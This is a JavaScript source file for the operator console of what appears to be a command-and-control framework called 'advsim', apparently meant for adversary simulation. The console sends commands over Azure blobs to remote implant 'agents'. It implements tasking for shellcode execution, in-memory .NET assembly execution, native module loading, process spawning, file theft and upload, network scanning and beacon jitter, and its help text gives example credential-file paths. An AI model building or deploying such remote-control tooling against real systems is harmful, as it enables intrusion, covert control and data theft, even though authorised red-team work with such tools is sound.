const { ipcRenderer } = require('electron');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const az = require('./azure');
const { log } = require('console');
global.historyload = false;
global.inputload = false;
const { getAppDataDir } = require('./common');
const directories = getAppDataDir();

function logToFile(logFile, message) {
    try {
        fs.appendFileSync(logFile, `${message}\n`);
    } catch (error) {
        log(error);
    }
}

let agentid_log = '';
let user_log = '';
let pid_log = '';
let currentSuggestionIndex = -1;
let suggestions = [];
let containerName = '';
let containerKey;
let containerBlob;
let agentObj;
let agent;
let window_agentid = "";

const commands = [
    'pwd', 'ls', 'cat', 'env', 'help',
    'spawn', 'drives', 'cat',
    'mv', 'sleep', 'cp', 'load',
    'upload', 'download', 'scexec', 'scan',
    'exit-all', 'assembly', 'help', 'dns'
];

const commandHistory = [];
let currentCommandIndex = -1;

function generateUUID(len) {
    if (len > 20) { len = 20 };
    const uuid = crypto.randomUUID();
    const shortUUID = uuid.replace(/-/g, '').substring(0, len);
    return shortUUID;
}

function timeDifference(oldTimestamp) {
    const now = Date.now();
    let diff = now - oldTimestamp;
    const msInSecond = 1000;
    const msInMinute = msInSecond * 60;
    const msInHour = msInMinute * 60;
    const msInDay = msInHour * 24;
    const days = Math.floor(diff / msInDay);
    diff %= msInDay;
    const hours = Math.floor(diff / msInHour);
    diff %= msInHour;
    const minutes = Math.floor(diff / msInMinute);
    diff %= msInMinute;
    const seconds = Math.floor(diff / msInSecond);
    let result = '';
    if (days > 0) result += `${days}d, `;
    if (hours > 0) result += `${hours}h, `;
    if (minutes > 0) result += `${minutes}m, `;
    if (seconds > 0 || result === '') result += `${seconds}s`;
    return result.trim().replace(/,\s*$/, '');
}

const commandDetails = [
    { name: "help", help: "Display help.\r\n" },
    { name: "pwd", help: "Print working directory\r\n\tpwd\r\n" },
    { name: "ls", help: "File and directory listing\r\n\tls [remote_path]\r\n\tls ./\r\n\tls C:/Users/user/Desktop/\r\n" },
    { name: "cat", help: "Display contents of a file\r\n\tcat [remote_path]\r\n\tcat ./kernel.js\r\n\tcat C:/Users/user/Desktop/creds.log\r\n" },
    { name: "env", help: "Display process environment variables\r\n\tenv\r\n" },
    { name: "spawn", help: "Spawn a child process\r\n\tspawn [cmd]\r\n\tspawn calc.exe\r\n" },
    { name: "drives", help: "List drives\r\n\tdrives\r\n" },
    { name: "mv", help: "Move a file to a new destination\r\n\tmv [remote_src] [remote_dst]\r\n\t" },
    { name: "sleep", help: "Sleep for seconds with jitter\r\n\sleep [s] [jitter%]\r\n\tsleep 20 15\r\n\t" },
    { name: "cp", help: "Copy a file\r\n\tcp [remote_src] [remote_dst]\r\n\t" },
    { name: "exit-all", help: "Exits the agent. The agent won't callback anymore\r\n\t" },
    { name: "load", help: "Load a node PE file from disk into the process\r\n\tload [remote_path]\r\n\tload ./git.node\r\n\t- Needs the ./ in front\r\n" },
    { name: "scexec", help: "Execute shellcode\r\n\tscexec [local_path]\r\n\tscexec /operator/src/shellcode/bin\r\n" },
    { name: "assembly", help: "Execute a .NET assembly and get command output\r\n\tassembly [local_path] [arg1] [arg2] ..\r\n\tassembly /operator/src/assembly arg1 arg2 arg3..\r\n" },
    { name: "upload", help: "Upload a file from your local operator box to the remote agent box\r\n\tupload [local_path] [remote_path]\r\n\tupload /operator/src/file /agent/dst/file\r\n" },
    { name: "download", help: "Download a file from remote agent box to local operator box /\r\n\tdownload [remote_path]\r\n\tdownload /agent/src/file\r\n\t- Get from View > Downloads\r\n" },
    { name: "scan", help: "scan <host> [-p<ports>] \r\n" +
        "        - The target host or CIDR range to scan.\r\n" +
        "        - Options:\r\n" +
        "            -p<ports>        Comma-separated list of ports to scan (default: 80, 443).\r\n" +
        "    Examples:\r\n" +
        "        scan 192.168.1.1 -p80,443\r\n" +
        "        scan 192.168.1.0/24 -p22,80,443\r\n" },
    { name: "dns", help: "dns lookup <hostname> [-all | -mx | -txt | -cname]\r\n" +
        "        - Perform a DNS lookup on the given hostname.\r\n" +
        "        - Options:\r\n" +
        "            -all        Get all IP addresses\r\n" +
        "            -mx         Get mail exchange (MX) records\r\n" +
        "            -txt        Get TXT records\r\n" +
        "            -cname    Get CNAME records\r\n" +
        "    dns resolve <hostname>\r\n" +
        "        - Resolve the hostname to an IP address\r\n" +
        "    dns reverse <ip-address>\r\n" +
        "        - Perform a reverse lookup on an IP address\r\n" +
        "    dns config\r\n" +
        "        - Show the current system DNS servers\r\n" +
        "    dns @<server>\r\n" +
        "        - Use a custom DNS server\r\n" +
        "    dns @default\r\n" +
        "        - Reset the DNS server config\r\n" },
    { name: "set", help: "Set the Node load paths for assembly node and scexec nodes\r\n\tset scexec_path C:/Users/user/AppData/ExcludedApp/scexec.node\r\n\tset assembly_path C:/Users/user/AppData/ExcludedApp/assembly.node\r\n" }
];

function getHelpInfo(command) {
    const parts = command.split(' ').filter(part => part !== '');
    if (parts.length > 1) {
        const cmdName = parts[1];
        const cmd = commandDetails.find(c => c.name === cmdName);
        return cmd ? cmd.help : `No help available for command: ${cmdName}`;
    } else {
        return "Command name missing. Use 'help <commandName>'.";
    }
}

function splitStringWithQuotes(str) {
    const result = [];
    let current = '';
    let insideQuotes = false;
    let quoteChar = '';
    for (let i = 0; i < str.length; i++) {
        const char = str[i];
        if (insideQuotes) {
            if (char === '\\' && (str[i + 1] === quoteChar || str[i + 1] === '\\')) {
                current += str[i + 1];
                i++;
            } else if (char === quoteChar) {
                insideQuotes = false;
                result.push(current);
                current = '';
            } else {
                current += char;
            }
        } else {
            if (char === '"' || char === "'") {
                insideQuotes = true;
                quoteChar = char;
            } else if (char === '\\' && str[i + 1] === ' ') {
                current += ' ';
                i++;
            } else if (char === ' ') {
                if (current.length > 0) {
                    result.push(current);
                    current = '';
                }
            } else {
                current += char;
            }
        }
    }
    if (current.length > 0) {
        result.push(current);
    }
    return result;
}

function doDownloadFile(argv) {
    const downloadFile = argv[1];
    const downloadBlob = generateUUID(10);
    const download = {
        'file': downloadFile,
        'blob': downloadBlob
    }
    return download;
}

function getFormattedTimestamp() {
    const now = new Date();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const year = now.getFullYear();
    let hours = now.getHours();
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12;
    hours = hours ? hours : 12;
    const timezoneInitials = now.toLocaleTimeString('en-us', { timeZoneName: 'short' }).split(' ')[2];
    const formattedTimestamp = `${month}-${day}-${year} ${hours}:${minutes}${ampm} ${timezoneInitials}`;
    return formattedTimestamp;
}

function sendCommand() {
    try {
        if (global.inputload === false) {
            return;
        }
        const input = document.getElementById('consoleInput');
        let command = input.value.trim();
        command = command.trim();
        commandHistory.push(command);
        let argv = splitStringWithQuotes(command);
        if (commandHistory.length > 1000) {
            commandHistory.shift();
        }
        currentCommandIndex = commandHistory.length;
        let PSString;
        if (agentObj) {
            PSString = `<span style="color:#acdff2">[${getFormattedTimestamp()}]</span> <span style="color:#ff0000">advsim</span>`
        }
        let UnknownCommand = true;
        commandDetails.forEach(thiscmd => {
            if (argv[0] === thiscmd.name) { UnknownCommand = false; }
        });
        if (UnknownCommand) {
            printToConsole(`Unknown command: ${command}`);
            input.value = '';
            closeDropdown();
            return;
        }
        if (command.startsWith("help")) {
            let platformElement = document.querySelector("#agentTable > tbody > tr > td:nth-child(8)");
            let platform;
            if (platformElement) {
                platform = platformElement.textContent.trim();
            }
            if (platform) {
                if (platform == "macOS" || platform == "Platform" || platform == "Linux") {
                    const removeCommands = ["scexec", "assembly"];
                    for (let i = commandDetails.length - 1; i >= 0; i--) {
                        if (removeCommands.includes(commandDetails[i].name)) {
                            commandDetails.splice(i, 1);
                        }
                    }
                }
            }
            if (argv.length > 1) {
                let commandHelp = getHelpInfo(command);
                printToConsole(`${PSString}$ ${command}`);
                printToConsole(commandHelp);
                input.value = '';
                closeDropdown();
                return;
            } else {
                const maxLength = commandDetails.reduce((max, cmd) => {
                    return cmd.name.length > max ? cmd.name.length : max;
                }, 0);
                commandDetails.forEach(thiscmd => {
                    const paddedName = thiscmd.name.padEnd(maxLength, ' ');
                    let cmdhelp = thiscmd.help.split('\r\n');
                    cmdhelp = cmdhelp[0];
                    printToConsole(`${paddedName} : ${cmdhelp}`);
                });
                input.value = '';
                closeDropdown();
                return;
            }
        }
        let containerCmd = JSON.parse(`{"blobs":${containerBlob}}`);
        containerCmd.key = JSON.parse(containerKey);
        containerCmd.name = containerName;
        containerCmd.cmd = command;
        let download;
        let upload = false;
        let scexec_upload = false;
        let assembly_upload = false;
        let uploadblob = "";
        let uploadfile = "";
        let argsAmountError = false;

        if (argv[0] === "sleep") {
            if (argv[1] === "0") {
                argv[1] = "1";
            }
        }

        if (argv[0] == "download") {
            if (argv.length == 2) {
                download = doDownloadFile(argv);
                command = `download ${download['file']} ${download['blob']}`;
                containerCmd.cmd = command;
                log(`agent-window.js : IPC : pull-download-file`);
                ipcRenderer.send('pull-download-file', JSON.stringify(containerCmd), download['file'], download['blob']);
            } else {
                argsAmountError = true;
            }
        }
        if (argv[0] == "upload") {
            if (argv.length == 3) {
                uploadfile = argv[1];
                const destFilePath = argv[2];
                uploadblob = 'u' + generateUUID(10);
                command = `upload ${uploadblob} ${destFilePath}`;
                containerCmd.cmd = command;
                upload = true;
            } else {
                argsAmountError = true;
            }
        }
        if (argv[0] == "scexec") {
            if (argv.length == 2) {
                scfile = argv[1];
                scblob = 'sc' + generateUUID(10);
                command = `scexec ${scblob}`;
                containerCmd.cmd = command;
                scexec_upload = true;
            } else {
                argsAmountError = true;
            }
        }
        if (argv[0] == "assembly") {
            if (argv.length > 1) {
                scfile = argv[1];
                let args = argv.slice(2).join(' ');
                log(`args string : ${args}`);
                scblob = 'sc' + generateUUID(10);
                command = `assembly ${scblob} ${args}`;
                containerCmd.cmd = command;
                assembly_upload = true;
            } else {
                argsAmountError = true;
            }
        }

        if (argsAmountError == true) {
            let ArgsError = `Incorrect amount of arguments supplied to ${argv[0]} command`;
            let commandHelp = getHelpInfo(argv[0]);
            printToConsole(ArgsError);
            printToConsole(commandHelp);
            input.value = '';
            closeDropdown();
            return;
        }

        log(`Sending command ${command}`);
        printToConsole(`${PSString}$ ${command}`);
        input.value = '';

        if (upload) {
            printToConsole(`Uploading operator ${uploadfile} file to blob ${uploadblob}`);
            ipcRenderer.send('upload-file-to-blob', JSON.stringify(containerCmd), uploadfile, uploadblob);
        } else if (assembly_upload) {
            printToConsole(`Uploading operator ${scfile} assembly file to blob ${scblob}`);
            ipcRenderer.send('upload-sc-to-blob', JSON.stringify(containerCmd), scfile, scblob);
        } else if (scexec_upload) {
            printToConsole(`Uploading operator ${scfile} shellcode file to blob ${scblob}`);
            ipcRenderer.send('upload-sc-to-blob', JSON.stringify(containerCmd), scfile, scblob);
        } else {
            log(`agent-window.js : IPC : upload-client-command-to-input-channel`);
            log(`containerCmd : \r\n${JSON.stringify(containerCmd)}`);
            ipcRenderer.send('upload-client-command-to-input-channel', JSON.stringify(containerCmd));
            closeDropdown();
        }
    } catch (error) {
        log(`[!] Error in sendCommand from agent window ${error} ${error.stack}`);
    }
}

ipcRenderer.on('send-upload-command', (event, containerCmd) => {
    try {
        printToConsole(`[+] Completed uploading operator file to blob`);
        ipcRenderer.send('upload-client-command-to-input-channel', containerCmd);
    } catch (error) {
        log(error);
    }
});

async function printToConsole(message, logToFileFlag = true) {
    try {
        const consoleOutput = document.getElementById('consoleOutput');
        const newLine = document.createElement('div');
        newLine.innerHTML = message;
        consoleOutput.appendChild(newLine);
        consoleOutput.scrollTop = consoleOutput.scrollHeight;
        let agent_log_name = `${pid_log}-${user_log}-${agentid_log}.log`;
        const logFile = path.join(directories.logDir, agent_log_name);
        if (logToFileFlag) {
            logToFile(logFile, `${message}\r\n`);
        }
    } catch (error) {
        console.error(`Error in printToConsole: ${error.message}\n${error.stack}`);
    }
}

function loadPreviousLogs() {
    try {
        let agent_log_name = `${pid_log}-${user_log}-${agentid_log}.log`;
        const logFile = path.join(directories.logDir, agent_log_name);
        log(`logfile : ${logFile}`);

        if (fs.existsSync(logFile)) {
            log(`Loading previous logs from ${logFile}`);
            const logs = fs.readFileSync(logFile, 'utf8');
            logs.split('\n').forEach(line => {
                let cleanedLine = line.replace(/^\[.*?\]\s*\[.*?\]\s*/, '').trim();
                if (cleanedLine) {
                    printToConsole(cleanedLine, false);
                }
            });
        } else {
            log(`No existing log file found for ${logFile}`);
        }
    } catch (error) {
        log(`Error loading previous logs: ${error.message}\n${error.stack}`);
    }
}

function clearConsole() {
    const consoleOutput = document.getElementById('consoleOutput');
    consoleOutput.innerHTML = '';
}

function showDropdown() {
    const inputLine = document.querySelector('.input-line');
    const dropdown = document.getElementById('commandDropdown');
    dropdown.innerHTML = '';
    const maxWidth = Math.max(...suggestions.map(s => s.length)) * 8;
    suggestions.forEach((suggestion, index) => {
        const item = document.createElement('div');
        item.textContent = suggestion;
        item.style.padding = '5px';
        if (index === currentSuggestionIndex) {
            item.style.backgroundColor = '#555';
            item.style.color = '#00ff00';
        }
        item.addEventListener('click', () => {
            const input = document.getElementById('consoleInput');
            input.value = suggestion;
            input.focus();
            closeDropdown();
        });
        dropdown.appendChild(item);
    });
    dropdown.style.display = suggestions.length ? 'block' : 'none';
    const rect = inputLine.getBoundingClientRect();
    dropdown.style.top = `${rect.bottom}px`;
    dropdown.style.left = `${rect.left}px`;
    dropdown.style.width = `${maxWidth + 20}px`;
    dropdown.style.whiteSpace = 'nowrap';
    if (rect.bottom + dropdown.offsetHeight > window.innerHeight) {
        dropdown.style.top = `${rect.top - dropdown.offsetHeight}px`;
    }
}

function closeDropdown() {
    const dropdown = document.getElementById('commandDropdown');
    dropdown.innerHTML = '';
    dropdown.style.display = 'none';
    currentSuggestionIndex = -1;
}

function handleInput(event) {
    const input = event.target.value;
    if (input) {
        suggestions = commands.filter(command => command.startsWith(input));
        currentSuggestionIndex = -1;
        showDropdown();
    } else {
        suggestions = commands;
        showDropdown();
    }
}

function handleTabCompletion(event) {
    event.preventDefault();
    if (suggestions.length > 0) {
        currentSuggestionIndex = (currentSuggestionIndex + 1) % suggestions.length;
        showDropdown();
        const input = document.getElementById('consoleInput');
        input.value = suggestions[currentSuggestionIndex];
    }
}

window.addEventListener('DOMContentLoaded', async () => {
    ipcRenderer.on('container-data', (event, name, aes, blobs, agentJson) => {
        try {
            containerName = name;
            containerKey = JSON.stringify(aes);
            containerBlob = JSON.stringify(blobs);
            agent = JSON.parse(agentJson);
            agentObj = agent;

            document.title = `${agent.agentid.toUpperCase()} | ${agent.hostname.toUpperCase()} | ${agent.username.toUpperCase()} | ${agent.IP}`;

            const input = document.getElementById('consoleInput');
            input.focus();
            input.selectionStart = input.selectionEnd = input.value.length;
        } catch (error) {
            log(error);
        }
    });
    ipcRenderer.on('agent-checkin', (event, checkin_data) => {
        try {
            printToConsole(`Checkin Data : ${checkin_data}`);
        } catch (error) {
            log(error);
        }
    });

    ipcRenderer.on('command-result', (event, result) => {
        printToConsole(result);
    });

    const input = document.getElementById('consoleInput');
    input.addEventListener('keydown', (event) => {
        if (event.key === 'Enter') {
            log(`Sending Enter key press event`);
            sendCommand();
        } else if (event.key === 'Tab') {
            handleTabCompletion(event);
        } else if (event.ctrlKey && event.key === 'l') {
            event.preventDefault();
            clearConsole();
        } else if (event.key === 'ArrowUp') {
            if (currentCommandIndex > 0) {
                currentCommandIndex--;
                input.value = commandHistory[currentCommandIndex];
            } else if (currentCommandIndex === 0) {
                input.value = commandHistory[currentCommandIndex];
            }
            event.preventDefault();
        } else if (event.key === 'ArrowDown') {
            if (currentCommandIndex < commandHistory.length - 1) {
                currentCommandIndex++;
                input.value = commandHistory[currentCommandIndex];
            } else if (currentCommandIndex === commandHistory.length - 1) {
                currentCommandIndex++;
                input.value = '';
            }
            event.preventDefault();
        }
    });
    input.addEventListener('input', handleInput);
    input.focus();
    input.selectionStart = input.selectionEnd = input.value.length;

    document.addEventListener('keydown', function (event) {
        if ((event.ctrlKey || event.metaKey) && event.key === 'c') {
            ipcRenderer.send('copy');
            event.preventDefault();
        }
        if ((event.ctrlKey || event.metaKey) && event.key === 'v') {
            ipcRenderer.send('paste');
            event.preventDefault();
        }
        if ((event.ctrlKey || event.metaKey) && event.key === 'x') {
            ipcRenderer.send('cut');
            event.preventDefault();
        }
    });
});

async function updateTable() {
    try {
        const agentTable = document.getElementById('agentTable').getElementsByTagName('tbody')[0];
        let agentid = agent.agentid;
        window_agentid = agentid;
        let agentcheckin = await ipcRenderer.invoke('get-agent-checkin', agentid);

        if (agentcheckin) {
            log(`agentcheckin : ${agentcheckin}`);
            agentcheckin = JSON.parse(agentcheckin);

            const filePath = agentcheckin.Process.trim();
            let fileName;
            if (filePath.includes("\\") && !filePath.includes("/")) {
                fileName = path.win32.basename(filePath);
            } else if (filePath.includes("/") && !filePath.includes("\\")) {
                fileName = path.posix.basename(filePath);
            } else {
                fileName = filePath.split(/[/\\]/).pop();
            }
            for (let row of agentTable.rows) {
                let platformName = agentcheckin.platform;
                if (agent.platform === "darwin") {
                    platformName = "macOS";
                } else if (agent.platform === "win32") {
                    platformName = "Windows";
                } else if (agent.platform === "linux") {
                    platformName = "Linux";
                }
                row.cells[0].textContent = agentcheckin.agentid;
                row.cells[1].textContent = agentcheckin.hostname;
                row.cells[2].textContent = agentcheckin.username;
                row.cells[3].textContent = fileName;
                row.cells[4].textContent = agentcheckin.PID;
                row.cells[5].textContent = agentcheckin.IP;
                row.cells[6].textContent = agentcheckin.arch;
                row.cells[7].textContent = platformName;
                row.cells[8].textContent = timeDifference(agentcheckin.checkin);
                agentid_log = agentcheckin.agentid;
                user_log = agentcheckin.username;
                pid_log = agentcheckin.PID;
            }
            if (global.historyload === false) {
                log(`Loading previous command history`);
                global.historyload = true;
                loadPreviousLogs();
            }
            global.inputload = true;
        }
    } catch (error) {
        log(`${error} ${error.stack}`);
    }
}
setInterval(updateTable, 1000);

ipcRenderer.on('command-output', (event, output) => {
    try {
        if (output) {
            printToConsole(output);
        }
    } catch (error) {
        log(`Error in ipcRender(delete-old-container): ${error.message}\r\n${error.stack}`);
    }
});

ipcRenderer.on('window-closing', async () => {
    try {
        log(`agent-window.js : IPC window-closing`);
        log(`agentid: ${window_agentid}`);
        ipcRenderer.send('force-close', window_agentid);
    } catch (error) {
        log(`Error in ipcRender(delete-old-container): ${error.message}\r\n${error.stack}`);
    }
});

document.addEventListener("keydown", function (event) {
    const consoleInput = document.getElementById("consoleInput");
    if (!consoleInput) return;
    const isCtrlOrMeta = event.ctrlKey || event.metaKey;
    const isAlt = event.altKey;
    if (isCtrlOrMeta) {
        switch (event.key.toLowerCase()) {
            case "a":
                event.preventDefault();
                consoleInput.select();
                log("Selected all text in consoleInput");
                break;
            case "arrowleft":
                event.preventDefault();
                moveCursorByWord(consoleInput, "left");
                log("Moved cursor back one word");
                break;
            case "arrowright":
                event.preventDefault();
                moveCursorByWord(consoleInput, "right");
                log("Moved cursor forward one word");
                break;
        }
    }
});

function moveCursorByWord(input, direction) {
    let pos = input.selectionStart;
    let value = input.value;
    if (direction === "left") {
        while (pos > 0 && value[pos - 1] === " ") pos--;
        while (pos > 0 && value[pos - 1] !== " ") pos--;
    } else if (direction === "right") {
        while (pos < value.length && value[pos] === " ") pos++;
        while (pos < value.length && value[pos] !== " ") pos++;
    }
    input.selectionStart = input.selectionEnd = pos;
}
